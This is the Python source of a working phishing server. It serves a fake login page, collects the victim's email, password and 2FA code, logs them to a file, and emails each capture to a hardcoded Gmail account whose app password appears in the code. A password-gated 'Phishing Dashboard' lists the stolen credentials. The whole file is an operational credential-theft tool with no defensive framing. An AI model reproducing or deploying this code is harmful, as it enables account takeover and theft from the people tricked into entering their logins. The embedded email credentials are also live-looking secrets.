#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
from datetime import datetime
import os
import smtplib
from email.mime.text import MIMEText

# ===== CONFIGURATION =====
DASHBOARD_PASSWORD = "phishing@10$"

# ===== EMAIL CONFIGURATION =====
GMAIL_USER = "ifiwas1898617@gmail.com"
GMAIL_PASSWORD = "qszetclmnqtshaoe"  # Your app password (no spaces)
NOTIFY_EMAIL = "ifiwas1898617@gmail.com"
# ================================

def send_email(email, password, totp, ip):
    """Send captured credentials via email"""
    try:
        msg = MIMEText(f"""
New Credentials Captured!
------------------------
Email: {email}
Password: {password}
2FA: {totp if totp else 'N/A'}
IP: {ip}
Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        """)
        msg['Subject'] = 'New Credential Captured'
        msg['From'] = GMAIL_USER
        msg['To'] = NOTIFY_EMAIL
        
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(GMAIL_USER, GMAIL_PASSWORD)
        server.send_message(msg)
        server.quit()
        print(f"[✓] Email sent for: {email}")
        return True
    except Exception as e:
        print(f"[✗] Email failed: {e}")
        return False

class Handler(BaseHTTPRequestHandler):
    
    def do_GET(self):
        if self.path == '/' or self.path == '/index.html':
            self.serve_file('index.html')
        elif self.path == '/error.html':
            self.serve_file('error.html')
        elif self.path.startswith('/dashboard'):
            self.serve_dashboard()
        elif self.path.startswith('/stats'):
            self.serve_stats()
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'Page not found')
    
    def serve_file(self, filename):
        try:
            with open(filename, 'rb') as f:
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(f.read())
        except FileNotFoundError:
            self.send_response(404)
            self.end_headers()
    
    def serve_dashboard(self):
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        
        if params.get('pass', [''])[0] != DASHBOARD_PASSWORD:
            self.send_response(401)
            self.end_headers()
            self.wfile.write(b'Unauthorized. Use ?pass=phishing@10$')
            return
        
        captured_data = ""
        if os.path.exists('captured_log.txt'):
            with open('captured_log.txt', 'r') as f:
                captured_data = f.read()
        
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Phishing Dashboard</title>
            <style>
                body {{ background: #0a0e27; color: #00ff00; font-family: monospace; padding: 20px; }}
                .card {{ background: #1a1f3a; padding: 20px; margin: 10px 0; border-radius: 8px; }}
                pre {{ background: #0d1127; padding: 15px; overflow-x: auto; }}
            </style>
        </head>
        <body>
            <h1>🔐 Phishing Dashboard</h1>
            <div class="card">
                <h2>📋 Captured Credentials</h2>
                <pre>{captured_data if captured_data else 'No credentials captured yet...'}</pre>
            </div>
            <p><a href="/">Home</a> | <a href="/stats?pass={DASHBOARD_PASSWORD}">Statistics</a></p>
        </body>
        </html>
        """
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def serve_stats(self):
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        
        if params.get('pass', [''])[0] != DASHBOARD_PASSWORD:
            self.send_response(401)
            self.end_headers()
            return
        
        total = 0
        if os.path.exists('captured_log.txt'):
            with open('captured_log.txt', 'r') as f:
                total = len(f.readlines())
        
        html = f"<html><body><h1>Statistics</h1><p>Total: {total}</p><a href='/dashboard?pass={DASHBOARD_PASSWORD}'>Back</a></body></html>"
        self.send_response(200)
        self.end_headers()
        self.wfile.write(html.encode())
    
    def do_POST(self):
        if self.path == '/login':
            length = int(self.headers['Content-Length'])
            data = self.rfile.read(length)
            parsed = urllib.parse.parse_qs(data.decode())
            
            email = parsed.get('email', [''])[0]
            password = parsed.get('password', [''])[0]
            totp = parsed.get('totp', [''])[0]
            ip = self.headers.get('X-Forwarded-For', self.client_address[0])
            
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Save to file
            with open('captured_log.txt', 'a') as f:
                f.write(f"[{timestamp}] {email} | {password} | 2FA:{totp} | IP:{ip}\n")
            
            # Send email notification
            send_email(email, password, totp, ip)
            
            print(f"\n[!] Captured: {email} | {password}")
            
            self.send_response(302)
            self.send_header('Location', '/error.html')
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

def run():
    port = int(os.environ.get('PORT', 5000))
    httpd = HTTPServer(('0.0.0.0', port), Handler)
    print(f"Server running on port {port}")
    print(f"Email notifications: ON -> {NOTIFY_EMAIL}")
    httpd.serve_forever()

if __name__ == '__main__':
    run()